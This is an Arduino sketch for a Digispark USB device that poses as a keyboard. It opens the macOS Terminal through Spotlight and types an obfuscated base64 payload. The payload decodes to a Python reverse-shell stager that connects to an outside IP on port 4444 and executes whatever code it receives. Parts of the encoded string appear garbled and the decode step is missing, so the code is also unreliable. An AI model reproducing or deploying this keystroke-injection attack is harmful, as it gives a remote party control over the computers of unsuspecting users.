#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
	DigiKeyboard.delay(400);
	DigiKeyboard.print("Terminal");
	DigiKeyboard.delay(200);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1500);
	DigiKeyboard.print("aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5ByYW5ByYW5ByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5OC41OC4xMDYuMjEwJyw0NDQ0KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlckKSkseydzJzpzfSkK");
	for(;;){}
}
